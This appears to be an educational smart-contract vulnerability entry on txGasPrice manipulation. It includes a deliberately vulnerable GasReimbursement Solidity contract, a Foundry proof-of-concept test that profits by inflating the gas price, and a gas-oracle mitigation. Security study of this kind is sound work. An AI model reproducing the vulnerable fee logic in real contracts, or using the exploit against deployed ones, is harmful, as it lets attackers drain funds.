# txGasPrice manipulation

**Name:** txGasPrice manipulation

**Description:** Manipulation of the txGasPrice value, which can result in unintended consequences and potential financial losses.

In the calculateTotalFee function, the total fee is calculated by multiplying gasUsed + GAS_OVERHEAD_NATIVE with txGasPrice. The issue is that the txGasPrice value can be manipulated by an attacker, potentially leading to an inflated fee calculation.

**Mitigation:**

To address this vulnerability, it is recommended to implement safeguards such as using a gas oracle to obtain the average gas price from a trusted source.

**REF:**

https://twitter.com/1nf0s3cpt/status/1678268482641870849

https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-03-21-Alligator.md

https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-15-Brahma.md

https://blog.pessimistic.io/ethereum-alarm-clock-exploit-final-thoughts-21334987c331

**GasReimbursement Contract:**

```jsx
contract GasReimbursement {
    uint public gasUsed = 100000; // Assume gas used is 100,000
    uint public GAS_OVERHEAD_NATIVE = 500; // Assume native token gas overhead is 500

    // uint public txGasPrice = 20000000000;  // Assume transaction gas price is 20 gwei

    function calculateTotalFee() public view returns (uint) {
        uint256 totalFee = (gasUsed + GAS_OVERHEAD_NATIVE) * tx.gasprice;
        return totalFee;
    }

    function executeTransfer(address recipient) public {
        uint256 totalFee = calculateTotalFee();
        _nativeTransferExec(recipient, totalFee);
    }

    function _nativeTransferExec(address recipient, uint256 amount) internal {
        payable(recipient).transfer(amount);
    }
}
```

***\*How to Test:\****

forge test --contracts src/test/**gas-price.sol**-vvvv

```jsx
// Test function to check gas refund in the GasReimbursementContract.
function testGasRefund() public {
    // Get the balance of this contract before executing the transfer.
    uint balanceBefore = address(this).balance;

    // Call the 'executeTransfer' function of the GasReimbursementContract, which should trigger a gas refund.
    GasReimbursementContract.executeTransfer(address(this));

    // Calculate the balance of this contract after the transfer and subtract the gas cost (gas price) from it.
    uint balanceAfter = address(this).balance - tx.gasprice; // --gas-price 200000000000000

    // Calculate and log the profit obtained by the contract from the gas refund.
    console.log("Profit", balanceAfter - balanceBefore);
}
```

**Red box: gas refund incorrectly**

![img](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F1a5cb283-c5d4-4bd2-b802-5ebb285537d3%2FUntitled.png?table=block&id=6fd4f616-4158-4f5a-9ae6-32cc3659b1e6&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)